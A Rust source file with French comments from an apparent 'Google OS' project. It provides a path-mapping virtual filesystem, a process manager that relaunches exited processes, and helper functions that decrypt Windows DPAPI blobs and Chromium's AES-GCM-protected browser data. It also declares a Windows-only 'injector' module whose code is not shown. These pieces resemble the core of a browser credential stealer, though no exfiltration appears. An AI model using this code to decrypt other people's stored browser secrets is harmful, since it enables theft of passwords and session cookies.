// SPDX-License-Identifier: Apache-2.0
use std::{
    collections::HashMap,
    path::PathBuf,
    process::{Child, Command},
};

use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce, aead::Aead};
use anyhow::{Result, anyhow};
use tracing::{info, warn};
#[cfg(target_os = "windows")]
use windows::Win32::Security::Cryptography::{CRYPT_INTEGER_BLOB, CryptUnprotectData};

#[cfg(target_os = "windows")] pub mod injector;

// Déclaration manuelle de LocalFree car manquante dans les bindings windows-rs 0.61
#[cfg(target_os = "windows")]
unsafe extern "system" {
    fn LocalFree(hmem: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
}

pub struct Vfs {
    root_path: PathBuf,
    mounts: HashMap<String, String>,
}

impl Default for Vfs {
    fn default() -> Self {
        Self::new().expect("Vfs::new() requires a readable working directory")
    }
}

impl Vfs {
    pub fn new() -> Result<Self> {
        let current_dir = std::env::current_dir()?;
        let mut mounts = HashMap::new();
        mounts.insert("/var/mirror".to_string(), "var/mirror".to_string());
        mounts.insert("/etc/google".to_string(), ".config".to_string());
        mounts.insert("/bin".to_string(), "bin".to_string());
        mounts.insert("/tmp".to_string(), "target/tmp".to_string());
        Ok(Self { root_path: current_dir, mounts })
    }

    pub fn resolve(&self, unix_path: &str) -> Result<PathBuf> {
        for (mount_point, local_rel_path) in &self.mounts {
            if unix_path.starts_with(mount_point) {
                let remainder = &unix_path[mount_point.len()..];
                let remainder = remainder.trim_start_matches(['/', '\\']);
                let mut full_path = self.root_path.clone();
                full_path.push(local_rel_path);
                full_path.push(remainder);
                return Ok(full_path);
            }
        }
        Err(anyhow!("Chemin non monté dans le VFS : {}", unix_path))
    }

    pub fn initialize_physical_layout(&self) -> Result<()> {
        for local_rel_path in self.mounts.values() {
            let mut full_path = self.root_path.clone();
            full_path.push(local_rel_path);
            if !full_path.exists() {
                std::fs::create_dir_all(&full_path)?;
            }
        }
        Ok(())
    }
}

pub struct ProcessManager {
    processes: HashMap<String, Child>,
}

impl Default for ProcessManager {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessManager {
    pub fn new() -> Self {
        Self { processes: HashMap::new() }
    }

    pub fn spawn(&mut self, name: &str, command: &str, args: &[&str]) -> Result<()> {
        info!("Lancement du processus : {} ({})", name, command);
        let child = Command::new(command).args(args).spawn()?;
        self.processes.insert(name.to_string(), child);
        Ok(())
    }

    pub fn check_and_revive(&mut self, name: &str, command: &str, args: &[&str]) -> Result<()> {
        if let Some(child) = self.processes.get_mut(name) {
            match child.try_wait() {
                Ok(Some(status)) => {
                    warn!("Processus {} terminé avec le statut : {}. Relance...", name, status);
                    self.spawn(name, command, args)?;
                },
                Ok(None) => (), // Toujours en cours
                Err(e) => warn!("Erreur lors de l'attente du processus {} : {}", name, e),
            }
        } else {
            self.spawn(name, command, args)?;
        }
        Ok(())
    }
}

/// Cryptographie Native Google OS
pub struct Crypto;

impl Crypto {
    /// Décryptage DPAPI (Data Protection API) de Windows.
    ///
    /// Disponible uniquement sur Windows : utilise `CryptUnprotectData` de l'API Win32.
    /// Les données déchiffrées sont allouées par Windows via `LocalAlloc` et libérées
    /// immédiatement après copie via `LocalFree`.
    #[cfg(target_os = "windows")]
    pub fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>> {
        // Safety: `CryptUnprotectData` alloue `output.pbData` via LocalAlloc.
        // On copie le contenu dans un Vec<u8> avant de le libérer avec LocalFree,
        // garantissant qu'aucun pointeur vers la région libérée ne subsiste.
        unsafe {
            let input =
                CRYPT_INTEGER_BLOB { cbData: data.len() as u32, pbData: data.as_ptr() as *mut u8 };
            let mut output = CRYPT_INTEGER_BLOB::default();

            if CryptUnprotectData(&input, None, None, None, None, 0, &mut output).is_ok() {
                let result =
                    std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                let _ = LocalFree(output.pbData.cast());
                Ok(result)
            } else {
                Err(anyhow!("Échec du décryptage DPAPI"))
            }
        }
    }

    /// Décryptage AES-256-GCM utilisé par Chromium (v80+).
    ///
    /// Le format attendu est : `[3 octets version][12 octets nonce][données chiffrées]`.
    pub fn decrypt_aes_gcm(ciphertext: &[u8], key: &[u8]) -> Result<Vec<u8>> {
        if ciphertext.len() < 15 {
            return Err(anyhow!("Données chiffrées trop courtes"));
        }

        let nonce_bytes = &ciphertext[3..15];
        let encrypted_data = &ciphertext[15..];

        let key = Key::<Aes256Gcm>::from_slice(key);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(nonce_bytes);

        cipher
            .decrypt(nonce, encrypted_data)
            .map_err(|e| anyhow!("Échec du décryptage AES-GCM : {}", e))
    }
}
